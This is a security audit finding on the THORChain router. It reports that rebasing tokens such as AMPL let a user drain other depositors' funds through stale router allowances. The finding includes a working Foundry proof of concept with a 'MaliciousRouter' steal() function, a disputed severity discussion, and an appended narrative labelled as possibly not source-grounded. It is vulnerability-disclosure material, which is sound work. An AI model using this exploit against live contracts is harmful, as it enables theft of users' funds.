---
id: 21551
severity: "High"
---

# A malicious user can steal money out of the vault and other users

## Description

A malicious user can steal money out of other users and the vault when a rebasing token like AMPL is used. That particular token is whitelisted as seen [here](https://gitlab.com/thorchain/thornode/-/blob/develop/common/tokenlist/ethtokens/eth_mainnet_latest.json?ref_type=heads).

## Proof of Concept

In particular, the AMPL token has a `_gonsPerFragment` variable that is used to change the balances of other users. The goal of that is to keep a stable price by manipulating the supply. This creates a huge issue for this particular protocol. The cause of the issue is the fact that upon a user moving his funds to another router, the router is being approved based on the amount of tokens he deposited. However, since that is a rebasing token, that amount can change and allow him to steal funds as explained below.

Imagine the following scenario (will keep it very simplistic):

  1. A malicious actor deposits 1000 tokens when the `_gonsPerFragment` is 1 and sets his address as the vault address. The balance of AMPL token in the contract is now 1000 and the allowance he has for his own address is also 1000.
  2. `_gonsPerFragment` is now 2 after the `rebase()` function was called on the AMPL contract, he could even frontrun it.
  3. He calls `transferAllowance()` with his own malicious router, address of the vault is not important, with `AMPL` as the asset and 1000 tokens as the amount.
  4. This calls `_routerDeposit()`, takes out his 1000 tokens from the allowance, approves the malicious router contract for 1000 tokens. The thing here is that the router should not take the tokens, it is just approved.

This is how the malicious router can look like (`depositWithExpiry()` is just a blank function):

```solidity
contract MaliciousRouter {
    function depositWithExpiry(address, address, uint256, string calldata, uint) public {}

    function steal(uint256 amount, address from, address to, address target) public {
        (bool ok, ) = target.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount));
        if (!ok) revert();
    }
}
```

  5. The balance of the contract is `1000 / 2 = 500` (as `_gonsPerFragment` is 2, take a look at the `AMPL` contract if not knowledgeable of how it works).
  6. Now, a legit user deposits 1000 tokens into a legit vault, now balance of the contract is `(1000 + 1000 * 2) / 2 = 1500` and the `_vaultAllowance` for the vault is `1500 - 500 = 1000`.
  7. The malicious user can now take some of those funds as he is approved for 1000 tokens, he calls the `steal()` function as specified in the malicious router contract above with his address as the receiver and 1000 tokens as the amount.
  8. The allowance check passes (`1000 - 1000 = 0`) and he successfully claims (`2000 / 2 = 1000 tokens`).
  9. The balance of the contract is now just `1000 / 2 = 500` tokens when the legit user actually deposited 1000.
  10. Whenever he tries to use call `transferOut()`, for example, he will only be able to pass 500 tokens as the input instead of 1000, he essentially lost 50% of his money.

In the end, the malicious user didn’t earn anything and he also didn’t lose anything but he managed to steal 500 tokens from the victim.

Also, if the balance of the contract increases instead, then that would lead to locked funds.

After reading the code more, there are even easier ways to exploit this issue. The deposit router does not even have to be changed, user can just call `transferOut()`, also funds can be deposited beforehand as well, user can frontrun the rebase by depositing and taking out his funds after it; essentially stealing money out of other users if the balance of AMPL decreased. However, the issue explained above and the POC for it, are still valid and possible.

For the POC, you can initiate a foundry project and paste the following code in `Counter.t.sol`. I simplified the AMPL token but it works the exact same way. You can compare it to the original one:

```solidity
pragma solidity 0.8.22;

import "../lib/forge-std/src/Test.sol";
import {THORChain_Router} from "../chain/ethereum/contracts/THORChain_Router.sol";

contract AMPLTokenSimplified {
    uint256 public _gonsPerFragment = 1;
    mapping(address => uint256) public _gonBalances;
    mapping(address => mapping(address => uint256)) public _allowedFragments;

    function rebase(uint256 gonsPerFragment_) public {
        _gonsPerFragment = gonsPerFragment_;
    }

    function balanceOf(address who) public view returns (uint256) {
        return _gonBalances[who] / (_gonsPerFragment);
    }

    function transfer(address to, uint256 value)
        public
        returns (bool)
    {
        uint256 gonValue = value * (_gonsPerFragment);

        require(_gonBalances[msg.sender] >= gonValue, "You just got beamed lol");
        
        _gonBalances[msg.sender] = _gonBalances[msg.sender] - (gonValue);
        _gonBalances[to] = _gonBalances[to] + (gonValue);

        return true;
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowedFragments[owner_][spender];
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        _allowedFragments[from][msg.sender] = _allowedFragments[from][msg.sender] - (value);

        uint256 gonValue = value * (_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from] - (gonValue);
        _gonBalances[to] = _gonBalances[to] + (gonValue);

        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _allowedFragments[msg.sender][spender] = value;

        return true;
    }

    function mint(uint256 amount, address to) public {
        _gonBalances[to] = amount;
    }
}

contract StealMoney is Test {
  THORChain_Router tcRouter;
  AMPLTokenSimplified ampl;
  MaliciousRouter mRouter;
  address malicious = makeAddr('malicious');
  address victim = makeAddr('legit');
  address vault = makeAddr('legitVault');

  function setUp() public {
    tcRouter = new THORChain_Router();
    ampl = new AMPLTokenSimplified();
    mRouter = new MaliciousRouter();
    ampl.mint(1000, malicious);
    ampl.mint(2000, victim);
  }

  function testStealMoney() public {
    vm.startPrank(malicious);
    ampl.approve(address(tcRouter), type(uint256).max);
    tcRouter.depositWithExpiry(payable(malicious), address(ampl), 1000, "you are about to get beamed", type(uint256).max); // Malicious user deposits 1000 tokens

    vm.assertEq(tcRouter.vaultAllowance(malicious, address(ampl)), 1000); // Vault allowance for the malicious user is 1000 tokens
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 1000); // Balance of contract is 1000 tokens

    ampl.rebase(2); // Set _gonsPerFragment to 2

    // Still pranking malicious
    tcRouter.transferAllowance(address(mRouter), malicious, address(ampl), 1000, "lol"); // This just approves 1000 tokens to spend to our malicious router

    vm.assertEq(tcRouter.vaultAllowance(malicious, address(ampl)), 0);
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 500); // Balance is now 500 because _gonsPerFragment is 2
    vm.assertEq(ampl.allowance(address(tcRouter), address(mRouter)), 1000); // Malicious router has been approved for 1000 tokens
    vm.stopPrank();

    vm.startPrank(victim);
    ampl.approve(address(tcRouter), type(uint256).max);
    tcRouter.depositWithExpiry(payable(vault), address(ampl), 1000, "i am about to get beamed :(", type(uint256).max);

    vm.assertEq(tcRouter.vaultAllowance(vault, address(ampl)), 1000); // Allowance for vault is 1000 tokens
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 1500); // Contract has 1500 tokens
    vm.stopPrank();

    uint256 maliciousBalanceBefore = ampl.balanceOf(malicious);
    mRouter.steal(1000, address(tcRouter), malicious, address(ampl)); // 1000 tokens to be sent from the router to the malicious guy
    uint256 maliciousBalanceAfter = ampl.balanceOf(malicious);

    assertEq(maliciousBalanceBefore, 0);
    assertEq(maliciousBalanceAfter, 1000); // 2000 / 2
    // Did not even lose money

    vm.assertEq(ampl.balanceOf(address(tcRouter)), 500); // Only 500 tokens left in the contract

    vm.startPrank(vault);
    // vm.expectRevert("You just got beamed lol");  // You can uncomment this line and paste this error message as the require statement error message after the transfer call to see this is where it reverts in transferOut()
    vm.expectRevert();
    tcRouter.transferOut(payable(victim), address(ampl), 1000, "did I just get beamed?...");

    uint256 victimBalanceBefore = ampl.balanceOf(victim);

    tcRouter.transferOut(payable(victim), address(ampl), 500, "omg I can only withdraw 500 tokens..");
    vm.stopPrank();
    
    uint256 victimBalanceAfter = ampl.balanceOf(victim);
    assertEq(victimBalanceBefore, 0);
    assertEq(victimBalanceAfter, 500);
  }
}

contract MaliciousRouter {
    function depositWithExpiry(address, address, uint256, string calldata, uint) public {}

    function steal(uint256 amount, address from, address to, address target) public {
        (bool ok, ) = target.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount));
        if (!ok) revert();
    }
}
```

## Recommendation

I don’t think the fix is trivial, I will give some ideas but they have to be carefully examined. First, one of the root causes for the issue is the approval given to the router that is not actually equal to the amount the user is supposed to receive as this is a rebasing token. If that is taken care of and the correct approval is given, I think this vulnerability shouldn’t be possible anymore.

I believe this issue is wrongly duplicated. The root cause of the issue it is duplicated to is improper setup for fee-on-transfer tokens and the impact is a DoS. The root cause of this issue is an improper setup for rebasing tokens and the impact is a direct theft of funds. This issue should be its own separate issue and should be a high.

Since the contracts don’t have code that handles both FoT/rebasing tokens, it is fair to combine the two issues together. If there was an attempt to handle one of the types, but it is bugged, that would indeed merit two different issues.

FoT tokens and rebasing tokens are not the same thing; they have different behaviors and different things that could go wrong when implementing them. 

**Root Cause:**

  * FoT case: `_transferOutAndCallV5()` assumes that the amount parameter is equal to the amount received.
  * Rebasing case: The contract assumes that the amount that was received time ago through a deposit will stay the same across that time which would not be the case.

**Impact:**

  * FoT case: User will be DoSed and funds will be locked.
  * Rebasing case: Direct theft of funds.

**Fix:**

  * FoT case: Use the actual amount received instead of the amount parameter.
  * Rebasing case: Do not assume that the balances will stay constant and implement a mechanism to handle that.

None of these match up and they should not be duplicated. Furthermore, as I mentioned, FoT tokens and rebasing tokens are not the same thing, it is like duplicating an issue regarding FoT tokens with an issue that used `transferFrom` on tokens that don’t revert on failure.

We don’t duplicate by impact or fixes, that’s irrelevant. The root cause is the same - devs did not have the presence of mind to deal with tokens with non standard balance mechanisms.

Respectfully, what makes this issue a Medium? Why is it not a high when this issue clearly explains an issue with a high severity? Here is a rule regarding that:

> Given the above, when similar exploits would demonstrate different impacts, the highest, most irreversible would be the one used for scoring the finding. Duplicates of the finding will be graded based on the achieved impact relative to the Submission Chosen for Report.

> More specifically, if fixing the Root Cause (in a reasonable manner) would cause the finding to no longer be exploitable, then the findings are duplicates.

Fixing one of the issues does not fix the other one, so your argument that you do not duplicate by fixes is not entirely correct.

Also, I don’t agree that the root cause is the same even ignoring the above rule. You are pulling the root cause up until it is similar but the actual root causes are different, incorrect handling of FoT tokens and incorrect handling of rebasing tokens. The way you generalize the root cause of the issue is similar to saying that all issues are duplicate because the developers wrote code that is wrong. 

Furthermore, they did have the presence of mind to deal with non-standard balance mechanisms. Take a look at this code in `deposit()`:
    
   
    safeAmount = safeTransferFrom(asset, amount);

Which then calls:
    
   
    // Safe transferFrom in case asset charges transfer fees
      function safeTransferFrom(
        address _asset,
        uint _amount
      ) internal returns (uint amount) {
        uint _startBal = iERC20(_asset).balanceOf(address(this));
        (bool success, bytes memory data) = _asset.call(
          abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            _amount
          )
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))));
        return (iERC20(_asset).balanceOf(address(this)) - _startBal);
      }

I assumed there is no differentiation at the code level between these. As it is clear they aimed to support FoT tokens, there are now clearly two separate root causes. Upgrading to High since it is clear these tokens are whitelisted and _intended_ to be used.

## Derived Narrative

The following field is derived content and may not be source-grounded:

A rebasing token such as AMPL is whitelisted in the Thorchain router contract and is treated as a regular ERC‑20 token. The contract records the amount a user deposits and then grants the router an allowance equal to that recorded amount. The implementation assumes that the token balance associated with the recorded amount remains constant after the deposit. Because a rebasing token changes the relationship between its internal "gons" balance and the external fragment balance whenever a rebase occurs, the recorded amount no longer reflects the actual token balance held by the contract. When a rebase reduces the fragment value, the contract’s internal balance is effectively larger than the allowance that was granted, allowing a malicious actor to approve a rogue router for the original deposited amount and then call transferFrom to move tokens out of the contract. The attacker can front‑run a rebase, deposit a known amount, wait for the rebase to change the conversion factor, and then use the stale allowance to steal tokens that belong to other users or to lock funds if the rebase increases the conversion factor. From a user’s perspective the symptom is that a legitimate depositor sees only a fraction of the expected balance when withdrawing (for example, a user deposits 1,000 AMPL but can only withdraw 500) while the attacker’s balance increases by the same amount. The impact is a direct theft of funds – up to 50 % of the victim’s deposit in the demonstrated scenario – and can also lead to a denial‑of‑service when the contract’s balance grows but the allowance does not, preventing legitimate withdrawals. The vulnerability is triggered only when a rebasing token is used, the router grants a static allowance based on the pre‑rebase deposit amount, and the contract does not recalculate or adjust allowances after a rebase. It was discovered during a security audit that examined the safeTransferFrom helper, which correctly returns the actual amount received but the surrounding logic still relies on the original deposit amount. The bug is subtle because the contract’s balanceOf view returns the correct external fragment balance, masking the internal mismatch between allowance and actual token holdings. To remediate the issue the contract must stop assuming a constant token balance after a deposit; it should either recompute the allowance based on the current token balance after each rebase, use the amount returned by safeTransferFrom for all subsequent calculations, or explicitly forbid rebasing tokens unless proper handling logic is added. Implementing a mechanism that tracks the real fragment balance or that resets allowances after a rebase would close the attack vector and restore the intended accounting guarantees of the vault.
